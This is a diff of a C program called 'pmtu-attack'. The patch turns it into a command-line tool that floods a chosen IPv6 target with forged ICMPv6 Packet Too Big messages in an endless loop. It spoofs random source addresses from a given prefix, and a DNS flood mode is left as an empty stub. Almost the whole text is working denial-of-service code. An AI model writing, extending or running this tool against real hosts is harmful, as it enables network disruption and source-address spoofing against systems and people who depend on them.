@@ -7,103 +7,131 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
+#include <getopt.h>
 #include <sys/wait.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <netinet/ip6.h>
 #include <netinet/icmp6.h>
 #include <arpa/inet.h>
+#include <netdb.h>
+#include <time.h>
 
-#define TARGET_ADDR "fd12:35::3f05:2108:5d2b:570"
-static const uint8_t SRC_NET[] = {
-	// fd12:34::/64
-	0xfd, 0x12, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00
-};
+#define ARGV0 "pmtu-attack"
 
-static_assert(sizeof(SRC_NET) <= 16);
 
-struct addr {
-	uint8_t a_addr[16];
-};
-typedef struct addr addr_t;
+struct {
+	struct {
+		int urnd;
+		int sck;
+	} fd;
+	struct {
+		char str_addr[INET6_ADDRSTRLEN + sizeof("%4294967295") - 1];
+	} dst;
+	struct {
+		struct timespec ts_last_report;
+		size_t last_it_cnt;
+	} bm;
+} gctx;
 
-int addr_comp_f (const void *a, const void *b) {
-	return memcmp(a, b, sizeof(addr_t));
+struct {
+	struct {
+		uint8_t addr[16];
+		uint8_t mask[16];
+		uint8_t len;
+	} src_net;
+	struct {
+		const char *str;
+		struct sockaddr_in6 sa;
+	} dst;
+	struct {
+		bool dryrun;
+		bool quiet;
+		union {
+			uint32_t help:1;
+		};
+	} flags;
+	int v;
+	const char *mode;
+} param;
+
+static void init_global (void) {
+	gctx.fd.urnd = -1;
+	gctx.fd.sck = -1;
 }
 
-#define ADDR_POOL_SIZE (1*1024*1024*1024 / 16)
-static addr_t addr_pool[ADDR_POOL_SIZE];
+static void free_global (void) {
+	close(gctx.fd.urnd);
+	close(gctx.fd.sck);
 
-void init_addr_pool (void) {
-	int fd;
-	ssize_t iofr;
+}
 
-	errno = 0;
-	fd = open("/dev/urandom", O_RDONLY);
-	perror("open(\"/dev/urandom\", O_RDONLY)");
-	assert(fd >= 0);
-
-	iofr = read(fd, addr_pool, sizeof(addr_pool));
-	assert(iofr == sizeof(addr_pool));
-	close(fd);
-
-	for (size_t i = 0; i < ADDR_POOL_SIZE; i += 1) {
-		memcpy(addr_pool + i, SRC_NET, sizeof(SRC_NET));
+static bool alloc_globals (void) {
+	gctx.fd.urnd = open("/dev/urandom", O_RDONLY);
+	if (gctx.fd.urnd < 0) {
+		perror("/dev/urandom");
+		return false;
 	}
-}
 
-bool check_entropy_main (void) {
-	size_t same_cnt = 0;
-	size_t ret;
-
-	// entropy check
-	qsort(addr_pool, ADDR_POOL_SIZE, sizeof(addr_t), addr_comp_f);
-
-	for (size_t i = 1; i < ADDR_POOL_SIZE; i += 1) {
-		if (memcmp(addr_pool + i - 1, addr_pool + i, sizeof(addr_t)) == 0) {
-			same_cnt += 1;
+	if (!param.flags.dryrun) {
+		gctx.fd.sck = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
+		if (gctx.fd.sck < 0) {
+			perror("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
+			return false;
 		}
 	}
 
-	ret = (size_t)ADDR_POOL_SIZE - same_cnt;
-	fprintf(stderr,
-		"uniq: %zu/%zu (%.3f)\n"
+	clock_gettime(CLOCK_MONOTONIC, &gctx.bm.ts_last_report);
+
+	return true;
+}
+
+static void genrnd (const size_t len, void *out) {
+	// the function will be called many times and read() takes a trip outside of
+	// userland. Needs some improvements.
+	read(gctx.fd.urnd, out, len);
+	// TODO: use ctrdrbg or mt
+}
+
+static void print_help (FILE *f) {
+	fprintf(f,
+"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] <-m MODE>|<--mode MODE>"
+"       [--] SRC_NET DST_ADDR\n"
+"MODE:        'ptb_flood_icmp6_echo' | 'txt_dns_flood'\n"
+"SRC_NET:     2001:db8:1:2::/64\n"
+"DST_ADDR:    any string accepted by getaddrinfo()\n"
+"Options:\n"
+"  -m, --mode     MODE  run in specified mode\n"
+"  -d, --dryrun   run in dry mode (don't actually send anything)\n"
+"  -v, --verbose  increase verbosity\n"
+"  -q, --quiet    report errors only\n"
+"  -h, --help     print this message and exit normally\n"
 		,
-		ret,
-		(size_t)ADDR_POOL_SIZE,
-		(double)ret/(double)ADDR_POOL_SIZE);
+		ARGV0);
+};
 
-	return ret > 1;
-}
+static void lock_ouput (void) {}
+static void unlock_ouput (void) {}
 
-void check_entropy (void) {
-	pid_t child;
-
-	child = fork();
-	assert(child >= 0);
-	if (child == 0) {
-		const bool fr = check_entropy_main();
-		exit(fr ? 0 : 1);
-	}
-	else {
-		int status = 0;
-		const pid_t fr = waitpid(child, &status, 0);
-
-		assert(fr == child);
-		assert(WEXITSTATUS(status) == 0);
-	}
-}
-
-void report_sent (const void *addr, const int err) {
+static void report_sent (const void *addr, const int err) {
 	char str_addr[INET6_ADDRSTRLEN] = { 0, };
 
 	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));
 
-	fprintf(stderr, "sendto %s: ", str_addr);
-	errno = err;
-	perror(NULL);
+	lock_ouput(); {
+		printf(
+			"{ \"what\": \"sendto\", \"msg\": { \"pid\": %d, \"from\": \"%s\", \"to\": \"%s\", \"error\": %d } }\n"
+			,
+			(int)getpid(),
+			str_addr,
+			gctx.dst.str_addr,
+			err
+		);
+	}
+	unlock_ouput();
 }
 
-uint16_t calc_chksum6 (
+static uint16_t calc_chksum6 (
 	const struct ip6_hdr *ih,
 	const uint8_t *nh,
 	size_t n_len,
@@ -160,18 +188,68 @@ uint16_t calc_chksum6 (
 	return ~((sum & 0xFFFF) + (sum >> 16));
 }
 
-void icmp6_ptb_tail (
-		const int fd,
-		const void *snd_buf,
-		const size_t snd_buf_len,
-		struct sockaddr_in6 *sa,
-		struct ip6_hdr *ih6,
-		struct icmp6_hdr *icmp6)
-{
+static void genrnd_src_addr (void *out) {
+	const size_t p_Blen = param.src_net.len / 8;
+	uint8_t *o = (uint8_t*)out;
+	uint8_t m;
+
+	genrnd(16 - p_Blen, o + p_Blen);
+
+	for (size_t i = 0; i < 16; i += 1) {
+		m = param.src_net.mask[i];
+		o[i] = (param.src_net.addr[i] & m) | (o[i] & ~m);
+	}
 }
 
-void mount_attack_icmp6_ptb(void) {
-	int fd;
+static void ts_sub (
+		struct timespec *out,
+		const struct timespec *a,
+		const struct timespec *b)
+{
+	if (a->tv_nsec < b->tv_nsec) {
+		out->tv_sec = a->tv_sec - 1 - b->tv_sec;
+		out->tv_nsec = 1000000000 + a->tv_nsec - b->tv_nsec;
+	}
+	else {
+		out->tv_sec = a->tv_sec - b->tv_sec;
+		out->tv_nsec = a->tv_nsec - b->tv_nsec;
+	}
+}
+
+static void do_report_print (
+		const size_t it_period,
+		const struct timespec *ts_elapsed)
+{
+	lock_ouput(); {
+		printf(
+			"{ \"what\": \"throughput\", \"msg\": { \"pid\": %d, \"duration\": %ld.%03ld, \"count\": %zu } }\n"
+			,
+			(int)getpid(),
+			(long)ts_elapsed->tv_sec,
+			ts_elapsed->tv_nsec / 1000000,
+			it_period
+		);
+	}
+	unlock_ouput();
+}
+
+static void do_report (const size_t cur_it) {
+	struct timespec ts_now, ts_elapsed;
+
+	clock_gettime(CLOCK_MONOTONIC, &ts_now);
+	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);
+
+	if (ts_elapsed.tv_sec <= 0) {
+		return;
+	}
+
+	do_report_print(cur_it - gctx.bm.last_it_cnt, &ts_elapsed);
+
+	gctx.bm.ts_last_report = ts_now;
+	gctx.bm.last_it_cnt = cur_it;
+}
+
+static void mount_attack_icmp6_ptb(void) {
 	static struct {
 		struct ip6_hdr ih6;
 		struct icmp6_hdr icmp6;
@@ -183,8 +261,7 @@ void mount_attack_icmp6_ptb(void) {
 	static struct sockaddr_in6 sa;
 	ssize_t fr;
 
-	fr = inet_pton(AF_INET6, TARGET_ADDR, &snd_buf.ih6.ip6_dst);
-	assert(fr > 0);
+	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
 	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
 	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
 	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
@@ -206,14 +283,9 @@ void mount_attack_icmp6_ptb(void) {
 	sa.sin6_family = AF_INET6;
 	memcpy(&sa.sin6_addr, &snd_buf.ih6.ip6_dst, 16);
 
-	errno = 0;
-	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
-	perror("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
-	assert(fd >= 0);
-
-	for (size_t i = 0; i < ADDR_POOL_SIZE; i += 1) {
-		memcpy(&snd_buf.ih6.ip6_src, addr_pool[i].a_addr, 16);
-		memcpy(&snd_buf.body.ih6.ip6_dst, addr_pool[i].a_addr, 16);
+	for (size_t it = 0; ; it += 1) {
+		genrnd_src_addr(&snd_buf.ih6.ip6_src);
+		memcpy(&snd_buf.body.ih6.ip6_dst, &snd_buf.ih6.ip6_src, 16);
 
 		snd_buf.body.icmp6.icmp6_cksum = 0;
 		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
@@ -233,46 +305,233 @@ void mount_attack_icmp6_ptb(void) {
 			0
 		));
 
-		fr = sendto(
-			fd,
+		errno = 0;
+		fr = param.flags.dryrun ? 0 : sendto(
+			gctx.fd.sck,
 			&snd_buf,
 			sizeof(snd_buf),
 			MSG_NOSIGNAL,
 			(const struct sockaddr*)&sa,
 			sizeof(struct sockaddr_in6));
 
-		if (fr < 0) {
+		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
 			report_sent(&snd_buf.ih6.ip6_src, errno);
+		}
+		if (!param.flags.quiet) {
+			do_report(it);
+		}
+	}
+}
+
+static int main_ptb_flood_icmp6_echo (void) {
+	// TODO: parallelise?
+	mount_attack_icmp6_ptb();
+	return 0;
+}
+
+static int main_txt_dns_flood (void) {
+	// TODO: parallelise?
+	return 0;
+}
+
+static void fill_prefix (uint8_t len, uint8_t *out) {
+	const size_t cnt_bytes = len / 8;
+	size_t i;
+
+	for (i = 0; i < cnt_bytes; i += 1) {
+		out[i] = 0xff;
+	}
+	len -= cnt_bytes * 8;
+	out += i;
+	for (i = 0; i < len; i += 1) {
+		*out = (*out << 1) | 1;
+	}
+}
+
+static bool parse_net_str (
+		const char *in_str,
+		void *addr,
+		void *mask,
+		uint8_t *len)
+{
+	char str[INET6_ADDRSTRLEN];
+	char *slash;
+	uint8_t ret_buf[16];
+	uint8_t ret_mask[16] = { 0, };
+	uint8_t ret_len = 0;
+	int fr;
+
+	strncpy(str, in_str, sizeof(str) - 1);
+	slash = strstr(str, "/");
+	if (slash != NULL) {
+		*slash = 0;
+
+		if (sscanf(slash + 1, "%"SCNu8, &ret_len) != 1 || ret_len > 128) {
+			errno = EINVAL;
+			return false;
+		}
+	}
+	else {
+		ret_len = 128;
+	}
+
+	fr = inet_pton(AF_INET6, str, ret_buf);
+	if (fr == 0) {
+		errno = EINVAL;
+		return false;
+	}
+	else if (fr < 0) {
+		return false;
+	}
+	fill_prefix(ret_len, ret_mask);
+
+	memcpy(addr, ret_buf, 16);
+	memcpy(mask, ret_mask, 16);
+	*len = ret_len;
+	return true;
+}
+
+static bool parse_param (const int argc, const char **argv) {
+	static const struct option LOPTS[] = {
+		{ "help",    false, NULL, 'h' },
+		{ "dryrun",  false, NULL, 'd' },
+		{ "quiet",   false, NULL, 'q' },
+		{ "mode",    true,  NULL, 'm' },
+		{ "verbose", false, NULL, 'v' },
+	};
+	int loi = -1;
+	int fr;
+	bool fallthrough = false;
+
+	while (true) {
+		fr = getopt_long(argc, (char *const*)argv, "hdqm:v", LOPTS, &loi);
+		if (fr < 0) {
+			break;
+		}
+
+		switch (fr) {
+		case 'h': fallthrough = (param.flags.help = true); break;
+		case 'd': param.flags.dryrun = true; break;
+		case 'q': param.flags.quiet = true; break;
+		case 'm': param.mode = optarg; break;
+		case 'v': param.v += 1; break;
+		default: return false;
 		}
 	}
 
-	// icmp6_ptb_tail(
-	// 	fd,
-	// 	&snd_buf,
-	// 	sizeof(snd_buf),
-	// 	&sa,
-	// 	&snd_buf.ih6,
-	// 	&snd_buf.icmp6);
+	if (fallthrough) {
+		return true;
+	}
 
-	close(fd);
+	if (param.mode == NULL) {
+		fprintf(stderr, ARGV0": missing option -m\n");
+		return false;
+	}
+
+	if (optind + 1 >= argc) {
+		fprintf(stderr, ARGV0": too few arguments\n");
+		return false;
+	}
+
+	fr = parse_net_str(
+		argv[optind],
+		param.src_net.addr,
+		param.src_net.mask,
+		&param.src_net.len
+	);
+	if (!fr) {
+		fprintf(stderr, ARGV0": ");
+		perror(argv[optind]);
+		return false;
+	}
+
+	param.dst.str = argv[optind + 1];
+
+	return true;
+}
+
+static bool resolve_dst (void) {
+	static struct addrinfo hints = { 0, };
+	int fr;
+	struct addrinfo *ai = NULL;
+	char addr_str[INET6_ADDRSTRLEN] = { 0, };
+
+	hints.ai_family = AF_INET6;
+	// hints.ai_socktype = SOCK_RAW;
+	// hints.ai_protocol = IPPROTO_RAW;
+	fr = getaddrinfo(param.dst.str, NULL, &hints, &ai);
+	if (fr != 0) {
+		return false;
+	}
+
+	// hostname resolve. copy the sa into our address space
+	assert(sizeof(param.dst.sa) == ai->ai_addrlen);
+	memcpy(&param.dst.sa, ai->ai_addr, sizeof(param.dst.sa));
+
+	// cache the selected dst address string for reporting purposes
+	inet_ntop(AF_INET6, &param.dst.sa.sin6_addr, addr_str, sizeof(addr_str));
+	if (param.dst.sa.sin6_scope_id > 0) {
+		snprintf(
+			gctx.dst.str_addr,
+			sizeof(gctx.dst.str_addr),
+			"%s%%%"PRIu32
+			,
+			addr_str,
+			param.dst.sa.sin6_scope_id
+		);
+	}
+	else {
+		strncpy(gctx.dst.str_addr, addr_str, sizeof(gctx.dst.str_addr) - 1);
+	}
+
+	freeaddrinfo(ai);
+	return true;
 }
 
 int main (const int argc, const char **argv) {
-	if (true) {
-		fprintf(stderr,
-			"initialising address pool: %zu addresses ...\n"
-			,
-			(size_t)ADDR_POOL_SIZE);
-		init_addr_pool();
+	int ec = 0;
 
-		fprintf(stderr, "checking entropy ...\n");
-		check_entropy();
+	init_global();
+
+	if (!parse_param(argc, argv)) {
+		ec = 2;
+		goto END;
 	}
 
-	if (true) {
-		fprintf(stderr, "mount_attack_icmp6_ptb()  ...\n");
-		mount_attack_icmp6_ptb();
+	if (param.flags.help) {
+		print_help(stdout);
+		goto END;
 	}
 
-	return 0;
+	if (!alloc_globals()) {
+		ec = 1;
+		goto END;
+	}
+
+	if (!resolve_dst()) {
+		fprintf(stderr, ARGV0": ");
+		perror(param.dst.str);
+		ec = 1;
+		goto END;
+	}
+	if (!param.flags.quiet) {
+		fprintf(stderr, ARGV0": selected target: %s\n", gctx.dst.str_addr);
+	}
+
+	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
+		ec = main_ptb_flood_icmp6_echo();
+	}
+	else if (strcmp(param.mode, "txt_dns_flood") == 0) {
+		ec = main_txt_dns_flood();
+	}
+	else {
+		fprintf(stderr, ARGV0": ");
+		errno = EINVAL;
+		perror(param.mode);
+		ec = 2;
+	}
+
+END:
+	free_global();
+	return ec;
 }
